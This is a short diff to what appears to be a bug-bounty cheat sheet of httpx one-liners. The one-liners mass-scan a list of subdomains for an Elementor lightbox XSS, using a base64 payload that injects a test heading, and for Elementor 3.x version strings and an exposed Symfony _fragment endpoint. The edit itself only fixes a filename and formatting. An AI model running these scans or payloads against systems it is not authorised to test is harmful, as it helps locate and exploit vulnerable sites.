@@ -49,8 +49,9 @@
 ## Elementor Xss
     cat subs.txt | httpx -path "#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8aDE+YWtpcmE8L2gxPiJ9" -ms <h1>akira</h1> -o elementorXss.txt -t 200
 
-    cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -ms "Stable tag: 3." -o elemntor.txt
-    ## Symphonic
+    cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -ms "Stable tag: 3." -o elementor.txt -t 200
+
+## Symphonic
     cat subs.txt | httpx -path "_fragment" -ms 'Oops An Error Occurred' -o symphonic.txt -t 200
     
 ## Open Redirect
